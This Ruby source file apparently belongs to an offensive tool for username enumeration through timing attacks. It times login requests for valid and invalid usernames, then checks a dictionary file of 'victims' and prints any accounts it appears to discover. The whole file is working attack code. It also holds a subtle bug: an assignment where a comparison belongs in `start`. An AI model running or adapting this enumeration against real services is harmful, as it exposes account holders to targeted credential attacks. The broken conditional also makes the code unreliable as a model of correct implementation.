# High level interface for handling attacks for a given request.
# The attack_type parameter will determine whether the attack is being 
# instantiated for a verification phase, or exploitation phase.
class Attack
	attr_reader		:is_exploitable,
					:confidence,
					:discovered_accounts

	@opts = nil
	@margin = 0

	def initialize(attack_type,opts)
		@opts = opts
		@attack_type = attack_type
		@valid_user = opts.valid_username
		@margin = opts.margin.to_i
		@req_count = opts.request_count.to_i
		@discovered_accounts = []
	end

	# Initial the actual attack. If this method returns false it indicates
	# that we're unsure whether the app is actually vuln.
	def start()
		if @attack_type = DETERMINE_EXPLOITABLE
			is_exploitable?
		else
			exploit
		end
	end

	def is_exploitable?
		return false if @valid_user.nil?

		if @req_count.nil? || @req_count.to_i > 10000
			puts "Please leverage request count between 0 and 10,000"
			exit
		end

		puts "Exploitability test started. Please be patient..."

		valid_request_sum = 0
		invalid_request_sum = 0
		@req_count.to_i.times do |req_num|
			valid_request = send_and_process_request(@valid_user)
			invalid_request = send_and_process_request(gen_invalid_username)

			valid_request_sum += valid_request[:response_time].to_i
			invalid_request_sum += invalid_request[:response_time].to_i
		end

		valid_avg_time = valid_request_sum / @req_count
		invalid_avg_time = invalid_request_sum / @req_count

		puts "Results:"
		puts "\tRequest Time w/ Valid Username: \t" + valid_avg_time.to_s + "ms"
		puts "\tRequest Time w/ Invalid Username: \t" + invalid_avg_time.to_s + "ms"
		puts "\tMargin: \t\t\t\t" + @margin.to_s + "ms"
		puts "\tAverage Difference: \t\t\t" + (valid_avg_time - invalid_avg_time).to_s + "ms"

		if valid_avg_time > invalid_avg_time + @margin
			@is_exploitable = true
			@confidence = 3
		end
	end

	def exploit
		return false if @valid_user.nil?

		invalid_request_sum = 0
		unsure_request_sum = 0

		# Compute time for known invalid user as benchmark
		@req_count.to_i.times do |req_num|
			invalid_request = send_and_process_request(gen_invalid_username)

			invalid_request_sum += invalid_request[:response_time].to_i
		end
		invalid_request_avg = invalid_request_sum / @req_count

		# Grab victims from file
		victims = fetch_victims

		# Time to start finding victim accounts
		victims.each do |em|
			unsure_request_sum = 0
			unsure_request_avg = 0
			@req_count.to_i.times do |req_num|
				unsure_request = send_and_process_request(em)

				unsure_request_sum += unsure_request[:response_time].to_i
			end
			unsure_request_avg = unsure_request_sum / @req_count

			# we're comparing request times with known invalid emails
			# to the email provided in this loop.
			if unsure_request_avg > invalid_request_avg + @margin
				puts "It appears we found an account: " + em + " w/ response time: " + 
						unsure_request_avg.to_s + "ms"
				@discovered_accounts.push(em)
			end	
		end
	end

	# Split file line by line. That being said, the only currently supported
	# dictionary format is new-line seperated
	def fetch_victims
		unless @opts.input_file
			puts "Error: Must provide dictionary file"
			exit
		end
		f = File.open(@opts.input_file)
		lines = f.read.split("\n")
		return lines
	end

	# TODO: Improve this to determine format of username and 
	#  		actually generate the correct format.
	def gen_invalid_username
		"afbhj23712fbbzziof@gmail.com"
	end

	def send_and_process_request(username)
		req = Request.new(username,@opts)
		req.execute
	end
end